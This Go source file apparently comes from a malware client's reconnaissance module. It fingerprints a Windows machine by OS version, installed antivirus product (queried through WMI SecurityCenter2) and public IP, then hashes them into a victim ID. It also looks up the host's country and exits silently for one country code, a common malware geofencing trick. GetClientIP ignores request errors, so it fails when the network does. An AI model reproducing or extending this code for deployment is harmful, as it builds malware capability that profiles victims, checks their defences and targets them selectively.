package miscs

import (
	"bytes"
	"crypto/md5"
	"encoding/hex"
	"io"
	"net/http"
	"os"
	"syscall"
	"unsafe"

	"github.com/StackExchange/wmi"
)

type OsVersionInfoExW struct {
	OSVersionInfoSize uint32
	MajorVersion      uint32
	MinorVersion      uint32
	BuildNumber       uint32
	PlatformId        uint32
	CsdVersion        [128]uint16
	ServicePackMajor  uint16
	ServicePackMinor  uint16
	SuiteMask         uint16
	ProductType       byte
	Reserved          byte
}

type AntivirusProduct struct {
	DisplayName string
}

func SystemHWID() string {
	uuid := GetWindows()
	uuid = uuid + GetAntivirus()
	uuid = uuid + GetClientIP()
	hash := md5.Sum([]byte(uuid))
	return hex.EncodeToString(hash[:])
}

func GetWindows() string {
	var osvi OsVersionInfoExW
	osvi.OSVersionInfoSize = uint32(unsafe.Sizeof(osvi))

	ntdll := syscall.NewLazyDLL("ntdll.dll")
	rtlGetVersion := ntdll.NewProc("RtlGetVersion")

	ret, _, _ := rtlGetVersion.Call(uintptr(unsafe.Pointer(&osvi)))
	if ret != 0 {
		return "N/A"
	}

	switch {
	case osvi.MajorVersion == 10 && osvi.MinorVersion == 0:
		if osvi.BuildNumber >= 22000 {
			return "Windows 11"
		}
		return "Windows 10"
	case osvi.MajorVersion == 6 && osvi.MinorVersion == 3:
		return "Windows 8.1"
	case osvi.MajorVersion == 6 && osvi.MinorVersion == 2:
		return "Windows 8"
	case osvi.MajorVersion == 6 && osvi.MinorVersion == 1:
		return "Windows 7"
	case osvi.MajorVersion == 6 && osvi.MinorVersion == 0:
		return "Windows Vista"
	case osvi.MajorVersion == 5 && osvi.MinorVersion == 2:
		return "Windows Server 2003"
	case osvi.MajorVersion == 5 && osvi.MinorVersion == 1:
		return "Windows XP"
	default:
		return "Unknown"
	}
}

func GetAntivirus() string {
	var products []AntivirusProduct

	query := "SELECT * FROM AntiVirusProduct"
	err := wmi.QueryNamespace(query, &products, `root\SecurityCenter2`)
	if err != nil {
		return "N/A"
	}

	if len(products) == 0 {
		return "N/A"
	}
	return products[0].DisplayName
}

func GetClientIP() string {
	rsp, _ := http.Get("https://checkip.amazonaws.com/")
	if rsp.StatusCode == 200 {
		defer rsp.Body.Close()
		buf, _ := io.ReadAll(rsp.Body)
		return string(bytes.TrimSpace(buf))
	}
	return "1.1.1.1"
}

func GetNation() string {
	rsp, err := http.Get("http://ip-api.com/line/" + GetClientIP() + "?fields=countryCode")
	if err != nil {
		return "N/A"
	}
	if rsp.StatusCode == 200 {
		defer rsp.Body.Close()
		buf, _ := io.ReadAll(rsp.Body)
		if string(buf) == "PS" {
			os.Exit(0)
		}
		return string(bytes.TrimSpace(buf))
	}
	return "N/A"
}
